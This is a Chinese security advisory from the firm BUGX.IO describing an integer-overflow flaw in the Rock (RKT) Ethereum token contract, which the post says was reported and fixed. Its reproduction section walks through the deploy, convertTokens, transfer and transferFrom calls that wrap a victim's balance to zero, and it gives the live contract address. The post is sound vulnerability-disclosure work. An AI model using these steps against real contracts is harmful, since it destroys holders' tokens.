***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **![7.png](https://image.3001.net/images/20180723/15323415226849.png)**

##  **一、背景介绍**

Rock （RKT）是由直布罗陀区块链交易所发布的代币，旨在支持GBX的运作和金融服务以及金融科技生态系统。

近期BUGX.IO安全团队在审计过程中发现 Rock (RKT) 合约存在可以上溢的漏洞，通过此上溢漏洞，合约管理员
masterContractAddress 可以利用此漏洞，恶意销毁个人的 token。

该漏洞并非严格意义上的严重漏洞，此类属于管理员权限过大而能遭成个人通证被恶意销毁。开发者注释了原本的检查条件，造成了此漏洞，同时审计人员在审计过程中容易忽略此处问题。

##  **二、漏洞说明**

观察`transfer`和`transferFrom`函数，`balances[_to] += _value;`
没有做条件判断可以上溢，因此攻击者可以故意使 `balances[_to]` 上溢，变为极小值，但因为 `totalSupply =
totalSupply.add(_balances[i]);` 做了限制，所以没有办法在一开始就让他们总和大于 uint256 ,但可以使用
convertTokens 增加，而 `convertTokens` 需要官方人员才可以执行。

###  **执行条件：**

1.由于总 token 余额 受到totalSupply 限制，只有合约 masterContractAddress 才有权限突破此限制。

2.需要攻击者的 `balances[attacker]+ balances[vitim] >= uint256`才能使用攻击成功。

###  **攻击场景：**

1.官方故意让 vitim 用户的余额上溢，变为极小值。

2.攻击者让官方为其增加余额，然后攻击者实施攻击，让 vitim 用户余额上溢。

###  **攻击流程：**

某正常用户拥有一定数量的 token ，设为 token1

masterContractAddress 使用 convertTokens 为攻击者余额增加 token2 (当 token1 + token2 >=
uint256 时即可实施攻击)

1.使用 transfer 上溢

attacker transfer 攻击 vitim 使其额度变为极小值。

2.使用 transferFrom上溢

attacker approve 使自己有转账额度。

attacker transferFrom 攻击 vitim 使其额度变为极小值。

##  **三、复现过程**

这里复现过程把将 vitim 用户 token 初始化为 2**256 - 50 而攻击者 token 为 50，两者加起可以溢出。

1.transfer 上溢

owner:0xdd870fa1b7c4700f2bd7f44238821c26f7392148

masterContractAddress:0xdd870fa1b7c4700f2bd7f44238821c26f7392148

vitim:0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db

attacker:0x14723a09acff6d2a60dcdf7aa4aff308fddc160c

### owner部署合约：

 **执行 deploy：**

"0xdd870fa1b7c4700f2bd7f44238821c26f7392148",["0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db"],["115792089237316195423570985008687907853269984665640564039457584007913129639886"]

 **执行 convertTokens：**

"50","0x14723a09acff6d2a60dcdf7aa4aff308fddc160c"

 **执行 enableTransfers ，使能交易，**

 **执行 balanceOf 查看此时两个地址的 balances :**

0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db 地址：

115792089237316195423570985008687907853269984665640564039457584007913129639886

0x14723a09acff6d2a60dcdf7aa4aff308fddc160c 地址：50

![图片1.png](https://image.3001.net/images/20180723/15323411038908.png)

### 切换到 attacker 执行攻击：

 **执行 transfer ：**

"0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db",50

执行 balanceOf 查看被balances :

![图片2.png](https://image.3001.net/images/20180723/15323411393507.png)

发现已经上溢变为 0。

2.transferFrom 上溢

owner:0xdd870fa1b7c4700f2bd7f44238821c26f7392148

masterContractAddress:0xdd870fa1b7c4700f2bd7f44238821c26f7392148

vitim:0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db

attacker:0x14723a09acff6d2a60dcdf7aa4aff308fddc160c

### owner部署合约：

 **执行 deploy：**

"0xdd870fa1b7c4700f2bd7f44238821c26f7392148",["0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db"],["115792089237316195423570985008687907853269984665640564039457584007913129639886"]

 **执行 convertTokens：**

"50","0x14723a09acff6d2a60dcdf7aa4aff308fddc160c"

 **执行 enableTransfers ，使能交易。**

 **执行 balanceOf 查看此时两个地址的 balances :**

0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db 地址：

115792089237316195423570985008687907853269984665640564039457584007913129639886

![图片3.png](https://image.3001.net/images/20180723/15323412015208.png)0x14723a09acff6d2a60dcdf7aa4aff308fddc160c
地址：50  

![图片4.png](https://image.3001.net/images/20180723/15323412142355.png)

### 切换到 attacker 执行攻击：

 **执行 approve：**

"0x14723a09acff6d2a60dcdf7aa4aff308fddc160c",50

 **执行 allowance：**

"0x14723a09acff6d2a60dcdf7aa4aff308fddc160c","0x14723a09acff6d2a60dcdf7aa4aff308fddc160c"

![图片5.png](https://image.3001.net/images/20180723/15323412448808.png)

 **执行 transferFrom ：**

"0x14723a09acff6d2a60dcdf7aa4aff308fddc160c","0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db",50

执行 balanceOf 查看被balances :

![图片6.png](https://image.3001.net/images/20180723/15323412646505.png!small)发现已经上溢变为0。  

##  **四、资料**

 **RKT 合约地址：**

<<https://etherscan.io//address/0x106aa49295b525fcf959aa75ec3f7dcbf5352f1c#code>>

 **masterContractAddress：**

<<https://etherscan.io/address/0x94446822a814bba2f45fe754bd25cb7e81685009#tokentxns>>

##  **五、资料**  

BUGX.IO是一家致力于区块链领域的安全公司。核心团队组建于2014年，我们在区块链生态安全、行业解决方案、安全建设、红蓝对抗等方面有深厚积累与过硬专业素养。

***本文作者 BUGX.IO-Tri0nes，转载请注明来自FreeBuf.COM**

